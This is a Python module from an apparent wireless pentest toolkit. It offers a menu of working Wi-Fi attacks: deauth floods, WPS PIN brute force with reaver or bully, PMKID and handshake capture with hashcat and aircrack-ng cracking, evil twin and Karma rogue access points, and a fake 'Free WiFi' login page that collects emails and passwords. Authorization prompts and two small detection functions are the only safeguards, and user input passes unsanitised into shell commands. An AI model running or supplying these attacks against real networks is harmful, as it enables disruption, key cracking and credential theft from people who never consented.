"""
WiFi Attack Suite - Advanced Wireless Security Assessment
Supports deauth, evil twin, WPS attacks, PMKID capture, handshake cracking, and rogue AP detection.
"""

import os
import time
from modules.utils import (
    run_command, check_tool, check_root, require_root,
    print_info, print_warning, print_error, print_status,
    print_section, print_banner, get_user_input, confirm_action,
    display_menu, Colors
)


def wifi_attack_suite():
    """Advanced WiFi Attack Suite."""
    while True:
        choice = display_menu("WiFi Attack Suite", [
            "Wireless interface management",
            "Advanced WiFi reconnaissance",
            "Deauthentication attack",
            "WPS PIN attack (reaver/bully)",
            "PMKID capture attack",
            "WPA handshake capture & crack",
            "Evil twin / rogue AP",
            "Karma attack setup",
            "Rogue AP detection",
            "WiFi jamming detection",
            "Captive portal creator",
            "Check WiFi attack tools",
        ], Colors.RED)
        if choice == 0: break
        elif choice == 1: _iface_management()
        elif choice == 2: _wifi_recon()
        elif choice == 3: _deauth_attack()
        elif choice == 4: _wps_attack()
        elif choice == 5: _pmkid_capture()
        elif choice == 6: _handshake_crack()
        elif choice == 7: _evil_twin()
        elif choice == 8: _karma_attack()
        elif choice == 9: _rogue_ap_detect()
        elif choice == 10: _jamming_detect()
        elif choice == 11: _captive_portal()
        elif choice == 12: _check_wifi_tools()


def _iface_management():
    """Manage wireless interfaces and monitor mode."""
    print_section("Wireless Interface Management")
    require_root("Interface management")
    stdout, _, _ = run_command("iw dev 2>&1")
    if stdout:
        print(stdout)
    else:
        stdout, _, _ = run_command("iwconfig 2>&1")
        if stdout: print(stdout)
    print_section("Options")
    sub = display_menu("Interface Actions", [
        "Enable monitor mode",
        "Disable monitor mode",
        "Change channel",
        "Change MAC address",
        "Change TX power",
    ], Colors.RED)
    if sub == 0: return
    iface = get_user_input("Interface name", "wlan0")
    if sub == 1:
        if check_tool("airmon-ng"):
            print_status("Enabling monitor mode via airmon-ng...")
            stdout, _, _ = run_command("airmon-ng check kill 2>&1", timeout=10)
            if stdout: print(stdout)
            stdout, _, _ = run_command("airmon-ng start %s 2>&1" % iface, timeout=10)
            if stdout: print(stdout)
        else:
            print_status("Enabling monitor mode manually...")
            run_command("ip link set %s down" % iface)
            run_command("iw %s set monitor control" % iface)
            run_command("ip link set %s up" % iface)
            print_info("Monitor mode enabled on %s" % iface)
    elif sub == 2:
        if check_tool("airmon-ng"):
            stdout, _, _ = run_command("airmon-ng stop %s 2>&1" % iface, timeout=10)
            if stdout: print(stdout)
        else:
            run_command("ip link set %s down" % iface)
            run_command("iw %s set type managed" % iface)
            run_command("ip link set %s up" % iface)
            print_info("Managed mode restored on %s" % iface)
            run_command("systemctl restart NetworkManager 2>/dev/null")
    elif sub == 3:
        channel = get_user_input("Channel number", "6")
        run_command("iw %s set channel %s" % (iface, channel))
        print_info("Channel set to %s" % channel)
    elif sub == 4:
        if not check_tool("macchanger"):
            print_error("macchanger required. Install: sudo apt install macchanger")
            return
        print_status("Current MAC:")
        stdout, _, _ = run_command("macchanger -s %s" % iface)
        if stdout: print(stdout)
        run_command("ip link set %s down" % iface)
        stdout, _, _ = run_command("macchanger -r %s 2>&1" % iface)
        if stdout: print(stdout)
        run_command("ip link set %s up" % iface)
        print_info("MAC address randomized.")
    elif sub == 5:
        power = get_user_input("TX power (dBm)", "30")
        stdout, _, _ = run_command("iw %s set txpower fixed %s00 2>&1" % (iface, power))
        print_info("TX power set to %s dBm" % power)


def _wifi_recon():
    """Advanced WiFi reconnaissance."""
    require_root("WiFi recon")
    iface = get_user_input("Monitor interface", "wlan0mon")
    duration = get_user_input("Scan duration (seconds)", "15")
    try:
        dur = int(duration)
    except ValueError:
        dur = 15
    if check_tool("airodump-ng"):
        outfile = "/tmp/wifi_recon_%d" % int(time.time())
        print_status("Running airodump-ng scan (%ds)..." % dur)
        run_command("timeout %d airodump-ng %s -w %s --output-format csv 2>&1" % (dur, iface, outfile), timeout=dur + 5)
        csv_file = outfile + "-01.csv"
        stdout, _, _ = run_command("cat %s 2>/dev/null" % csv_file)
        if stdout:
            print_section("Discovered Access Points & Clients")
            print(stdout[:5000])
            # Parse and display summary
            lines = stdout.split("\n")
            ap_count = sum(1 for l in lines if "WPA" in l or "WEP" in l or "OPN" in l)
            print_info("Access points found: ~%d" % ap_count)
        run_command("rm -f %s* 2>/dev/null" % outfile)
    elif check_tool("iw"):
        print_status("Scanning with iw (%ds)..." % dur)
        stdout, _, _ = run_command("iw %s scan 2>&1" % iface.replace("mon", ""), timeout=dur + 5)
        if stdout:
            print_section("Scan Results")
            # Parse iw output for key fields
            current_bss = ""
            for line in stdout.split("\n"):
                line = line.strip()
                if line.startswith("BSS "):
                    current_bss = line.split("(")[0].replace("BSS ", "").strip()
                    print_info("\n  BSSID: %s" % current_bss)
                elif "SSID:" in line:
                    print_info("  %s" % line)
                elif "signal:" in line:
                    print_info("  %s" % line)
                elif "capability:" in line:
                    print_info("  %s" % line)
                elif "WPA:" in line or "RSN:" in line:
                    print_warning("  %s" % line)
    else:
        print_error("airodump-ng or iw required.")


def _deauth_attack():
    """Deauthentication attack."""
    if not check_tool("aireplay-ng"):
        print_error("aireplay-ng required. Install: sudo apt install aircrack-ng")
        return
    require_root("Deauth attack")
    print_warning("WARNING: Deauth attacks are illegal without authorization!")
    if not confirm_action("Do you have written authorization to perform this attack?"):
        return
    iface = get_user_input("Monitor interface", "wlan0mon")
    bssid = get_user_input("Target AP BSSID (MAC address)")
    if not bssid:
        return
    client = get_user_input("Target client MAC (or leave empty for broadcast)", "")
    count = get_user_input("Number of deauth packets", "10")
    if client:
        cmd = "aireplay-ng -0 %s -a %s -c %s %s 2>&1" % (count, bssid, client, iface)
    else:
        cmd = "aireplay-ng -0 %s -a %s %s 2>&1" % (count, bssid, iface)
    print_status("Sending %s deauth packets..." % count)
    stdout, stderr, _ = run_command(cmd, timeout=30)
    output = stdout if stdout else stderr
    if output: print(output)


def _wps_attack():
    """WPS PIN brute force attack."""
    require_root("WPS attack")
    print_warning("WARNING: WPS attacks are illegal without authorization!")
    if not confirm_action("Do you have written authorization?"):
        return
    iface = get_user_input("Monitor interface", "wlan0mon")
    bssid = get_user_input("Target AP BSSID")
    if not bssid:
        return
    if check_tool("reaver"):
        print_status("Starting Reaver WPS attack...")
        cmd = "timeout 120 reaver -i %s -b %s -vv 2>&1" % (iface, bssid)
        stdout, stderr, _ = run_command(cmd, timeout=130)
        output = stdout if stdout else stderr
        if output: print(output[:3000])
    elif check_tool("bully"):
        print_status("Starting Bully WPS attack...")
        cmd = "timeout 120 bully %s -b %s -v 3 2>&1" % (iface, bssid)
        stdout, stderr, _ = run_command(cmd, timeout=130)
        output = stdout if stdout else stderr
        if output: print(output[:3000])
    else:
        print_error("reaver or bully required. Install: sudo apt install reaver")


def _pmkid_capture():
    """PMKID hash capture for offline cracking."""
    require_root("PMKID capture")
    print_warning("WARNING: Only use on networks you own or have authorization to test!")
    if not confirm_action("Do you have written authorization?"):
        return
    iface = get_user_input("Monitor interface", "wlan0mon")
    bssid = get_user_input("Target AP BSSID")
    if not bssid:
        return
    duration = get_user_input("Capture duration (seconds)", "30")
    try:
        dur = int(duration)
    except ValueError:
        dur = 30
    if check_tool("hcxdumptool"):
        outfile = "/tmp/pmkid_%d.pcapng" % int(time.time())
        print_status("Capturing PMKID with hcxdumptool (%ds)..." % dur)
        cmd = "timeout %d hcxdumptool -i %s --enable_status=1 -o %s --filtermode=2 --filterlist_ap=%s 2>&1" % (dur, iface, outfile, bssid)
        stdout, _, _ = run_command(cmd, timeout=dur + 5)
        if stdout: print(stdout[:2000])
        if check_tool("hcxpcapngtool"):
            hashfile = "/tmp/pmkid_%d.hash" % int(time.time())
            print_status("Converting to hashcat format...")
            stdout, _, _ = run_command("hcxpcapngtool -o %s %s 2>&1" % (hashfile, outfile))
            if stdout: print(stdout)
            print_info("Hashcat command: hashcat -m 22000 %s wordlist.txt" % hashfile)
    else:
        print_error("hcxdumptool required. Install: sudo apt install hcxdumptool hcxtools")
        print_info("Alternative: use airodump-ng to capture handshake (option 6)")


def _handshake_crack():
    """Capture and crack WPA/WPA2 handshake."""
    while True:
        sub = display_menu("Handshake Capture & Crack", [
            "Capture WPA handshake",
            "Crack with aircrack-ng (wordlist)",
            "Crack with hashcat (GPU)",
            "Convert cap to hashcat format",
        ], Colors.RED)
        if sub == 0: break
        elif sub == 1:
            require_root("Handshake capture")
            iface = get_user_input("Monitor interface", "wlan0mon")
            bssid = get_user_input("Target AP BSSID")
            channel = get_user_input("AP channel")
            if not bssid or not channel:
                continue
            outfile = "/tmp/handshake_%d" % int(time.time())
            duration = get_user_input("Capture duration (seconds)", "30")
            try:
                dur = int(duration)
            except ValueError:
                dur = 30
            print_status("Capturing handshake on channel %s (%ds)..." % (channel, dur))
            cmd = "timeout %d airodump-ng -c %s --bssid %s -w %s %s 2>&1" % (dur, channel, bssid, outfile, iface)
            stdout, _, _ = run_command(cmd, timeout=dur + 5)
            if stdout: print(stdout[:2000])
            cap_file = outfile + "-01.cap"
            stdout, _, _ = run_command("ls -la %s 2>&1" % cap_file)
            if stdout and "No such file" not in stdout:
                print_info("Capture file: %s" % cap_file)
                if confirm_action("Send deauth to force handshake?"):
                    run_command("aireplay-ng -0 5 -a %s %s 2>&1" % (bssid, iface), timeout=10)
                    print_info("Deauth sent. Re-run capture to get handshake.")
        elif sub == 2:
            if not check_tool("aircrack-ng"):
                print_error("aircrack-ng required.")
                continue
            cap_file = get_user_input("Capture file (.cap)")
            wordlist = get_user_input("Wordlist path", "/usr/share/wordlists/rockyou.txt")
            if not cap_file:
                continue
            print_status("Cracking with aircrack-ng...")
            stdout, _, _ = run_command("aircrack-ng -w %s %s 2>&1" % (wordlist, cap_file), timeout=300)
            if stdout: print(stdout[:5000])
        elif sub == 3:
            if not check_tool("hashcat"):
                print_error("hashcat required.")
                continue
            hash_file = get_user_input("Hash file (22000 format)")
            wordlist = get_user_input("Wordlist path", "/usr/share/wordlists/rockyou.txt")
            if not hash_file:
                continue
            print_status("Cracking with hashcat (GPU)...")
            stdout, _, _ = run_command("hashcat -m 22000 %s %s --force 2>&1" % (hash_file, wordlist), timeout=300)
            if stdout: print(stdout[:5000])
        elif sub == 4:
            if not check_tool("hcxpcapngtool"):
                print_error("hcxpcapngtool required. Install: sudo apt install hcxtools")
                continue
            cap_file = get_user_input("Capture file (.cap/.pcapng)")
            outfile = get_user_input("Output hash file", "/tmp/handshake.22000")
            stdout, _, _ = run_command("hcxpcapngtool -o %s %s 2>&1" % (outfile, cap_file))
            if stdout: print(stdout)
            print_info("Use: hashcat -m 22000 %s wordlist.txt" % outfile)


def _evil_twin():
    """Evil twin / rogue access point setup."""
    require_root("Evil twin")
    print_warning("WARNING: Evil twin attacks are illegal without authorization!")
    if not confirm_action("Do you have written authorization?"):
        return
    ssid = get_user_input("SSID to clone")
    if not ssid:
        return
    iface = get_user_input("Wireless interface", "wlan0")
    channel = get_user_input("Channel", "6")
    if check_tool("hostapd"):
        config = "interface=%s\ndriver=nl80211\nssid=%s\nhw_mode=g\nchannel=%s\n" % (iface, ssid, channel)
        config_file = "/tmp/hostapd_evil.conf"
        with open(config_file, "w") as f:
            f.write(config)
        print_info("hostapd config written to %s" % config_file)
        print_info("Start with: hostapd %s" % config_file)
        print_info("Then set up DHCP: dnsmasq --interface=%s --dhcp-range=10.0.0.10,10.0.0.50,12h" % iface)
        if confirm_action("Start evil twin now?"):
            run_command("ip addr add 10.0.0.1/24 dev %s 2>/dev/null" % iface)
            print_status("Starting hostapd...")
            stdout, _, _ = run_command("timeout 60 hostapd %s 2>&1 &" % config_file, timeout=5)
            if check_tool("dnsmasq"):
                run_command("dnsmasq --interface=%s --dhcp-range=10.0.0.10,10.0.0.50,12h --no-daemon 2>&1 &" % iface, timeout=5)
            print_info("Evil twin running. Press Ctrl+C to stop.")
    else:
        print_error("hostapd required. Install: sudo apt install hostapd")
        print_info("Manual method: create_ap %s eth0 '%s' (if create_ap is installed)" % (iface, ssid))


def _karma_attack():
    """Karma/MANA attack - respond to all probe requests."""
    require_root("Karma attack")
    print_warning("WARNING: Karma attacks are illegal without authorization!")
    if not confirm_action("Do you have written authorization?"):
        return
    if not check_tool("hostapd-mana") and not check_tool("hostapd"):
        print_error("hostapd-mana or hostapd required.")
        return
    iface = get_user_input("Wireless interface", "wlan0")
    if check_tool("hostapd-mana"):
        config = """interface=%s
driver=nl80211
ssid=FreeWiFi
channel=6
enable_karma=1
karma_black_white=1
""" % iface
        config_file = "/tmp/karma.conf"
        with open(config_file, "w") as f:
            f.write(config)
        print_info("Karma config: %s" % config_file)
        print_info("Start: hostapd-mana %s" % config_file)
    else:
        print_warning("hostapd-mana not found. Using regular hostapd.")
        print_info("For full Karma support, install hostapd-mana from Kali repos.")


def _rogue_ap_detect():
    """Detect rogue access points on the network."""
    require_root("Rogue AP detection")
    iface = get_user_input("Wireless interface", "wlan0")
    known_aps = get_user_input("Known AP BSSIDs (comma-separated, or 'scan' to learn)", "scan")
    if known_aps == "scan":
        print_status("Learning known APs (10s baseline scan)...")
        if check_tool("iw"):
            stdout, _, _ = run_command("iw %s scan 2>&1" % iface, timeout=15)
        elif check_tool("nmcli"):
            stdout, _, _ = run_command("nmcli dev wifi list 2>&1", timeout=10)
        else:
            stdout = ""
        if stdout:
            print_section("Current Access Points (baseline)")
            print(stdout[:3000])
            print_info("Save these BSSIDs as your baseline. New APs appearing later could be rogue.")
    else:
        known = [x.strip().upper() for x in known_aps.split(",")]
        print_status("Scanning for rogue APs...")
        if check_tool("iw"):
            stdout, _, _ = run_command("iw %s scan 2>&1" % iface, timeout=15)
        elif check_tool("nmcli"):
            stdout, _, _ = run_command("nmcli dev wifi list 2>&1", timeout=10)
        else:
            stdout = ""
        if stdout:
            for line in stdout.split("\n"):
                for k in known:
                    if k in line.upper():
                        break
                else:
                    if "BSS " in line or "SSID" in line:
                        print_warning("  UNKNOWN: %s" % line.strip())


def _jamming_detect():
    """Detect WiFi jamming or interference."""
    require_root("Jamming detection")
    iface = get_user_input("Wireless interface", "wlan0")
    duration = get_user_input("Monitor duration (seconds)", "30")
    try:
        dur = int(duration)
    except ValueError:
        dur = 30
    print_status("Monitoring for jamming indicators (%ds)..." % dur)
    print_section("Interference Analysis")
    # Check noise levels
    stdout, _, _ = run_command("iw %s survey dump 2>&1" % iface)
    if stdout:
        print(stdout[:2000])
    # Monitor for excessive deauths (sign of jamming)
    if check_tool("tcpdump"):
        print_section("Deauth Frame Detection (%ds)" % min(dur, 10))
        stdout, _, _ = run_command(
            "timeout %d tcpdump -i %s -c 100 'subtype deauth or subtype disassoc' 2>&1" % (min(dur, 10), iface),
            timeout=min(dur, 10) + 5)
        if stdout:
            deauth_count = stdout.count("DeAuthentication") + stdout.count("Disassociation")
            print_info("Deauth/Disassoc frames detected: %d" % deauth_count)
            if deauth_count > 10:
                print_error("HIGH number of deauth frames - possible jamming/deauth attack!")
            elif deauth_count > 0:
                print_warning("Some deauth frames detected - monitor closely.")
            else:
                print_info("No suspicious deauth activity.")
        else:
            print_info("No deauth frames captured.")


def _captive_portal():
    """Create a captive portal for authorized testing."""
    require_root("Captive portal")
    print_warning("WARNING: Only use on YOUR OWN test networks!")
    if not confirm_action("Do you have authorization?"):
        return
    print_section("Captive Portal Setup")
    print_info("Requirements: hostapd, dnsmasq, iptables, python3 (http.server)")
    iface = get_user_input("Wireless interface", "wlan0")
    ssid = get_user_input("Portal SSID", "Free_WiFi")
    portal_dir = "/tmp/captive_portal"
    run_command("mkdir -p %s" % portal_dir)
    # Create simple portal page
    html = """<!DOCTYPE html><html><head><title>WiFi Login</title>
<style>body{font-family:Arial;text-align:center;padding:50px;background:#1a1a2e;color:#fff}
input{padding:10px;margin:5px;border-radius:5px;border:none}
button{padding:10px 30px;background:#e94560;color:#fff;border:none;border-radius:5px;cursor:pointer}</style></head>
<body><h1>Free WiFi Access</h1><p>Please log in to access the internet</p>
<form method="POST" action="/login"><input name="email" placeholder="Email"><br>
<input name="password" type="password" placeholder="Password"><br>
<button type="submit">Connect</button></form>
<p style="color:#888;font-size:12px">This is a security test - authorized use only</p></body></html>"""
    with open("%s/index.html" % portal_dir, "w") as f:
        f.write(html)
    print_info("Portal page created: %s/index.html" % portal_dir)
    print_info("\nTo start manually:")
    print_info("  1. hostapd /tmp/hostapd.conf")
    print_info("  2. dnsmasq --interface=%s --dhcp-range=10.0.0.10,10.0.0.50,12h" % iface)
    print_info("  3. iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080")
    print_info("  4. cd %s && python3 -m http.server 8080" % portal_dir)


def _check_wifi_tools():
    """Check available WiFi attack tools."""
    print_section("WiFi Attack Tool Availability")
    tools = {
        "aircrack-ng": "WPA/WPA2 key cracker",
        "airodump-ng": "WiFi packet capture & scanner",
        "aireplay-ng": "WiFi packet injection (deauth)",
        "airmon-ng": "Monitor mode manager",
        "reaver": "WPS brute force",
        "bully": "WPS brute force (alternative)",
        "hostapd": "Access point daemon",
        "hostapd-mana": "Karma/MANA attack AP",
        "dnsmasq": "DHCP/DNS server",
        "create_ap": "Easy AP creation script",
        "wifite": "Automated WiFi auditor",
        "hcxdumptool": "PMKID capture tool",
        "hcxpcapngtool": "Cap to hashcat converter",
        "hashcat": "GPU hash cracker",
        "macchanger": "MAC address changer",
        "mdk3": "WiFi exploitation tool",
        "mdk4": "WiFi exploitation tool v4",
        "pixiewps": "WPS offline brute force",
        "iw": "Wireless configuration",
        "iwconfig": "Legacy wireless config",
        "nmcli": "NetworkManager CLI",
    }
    available = []
    missing = []
    for tool, desc in tools.items():
        if check_tool(tool):
            print_info("  [+] %-20s - %s" % (tool, desc))
            available.append(tool)
        else:
            print_error("  [-] %-20s - %s" % (tool, desc))
            missing.append(tool)
    print_info("\nAvailable: %d/%d" % (len(available), len(tools)))
    if missing and confirm_action("Install aircrack-ng suite?"):
        run_command("sudo apt install -y aircrack-ng reaver hostapd dnsmasq macchanger hcxdumptool hcxtools 2>&1", timeout=120)
        print_info("Installation complete.")
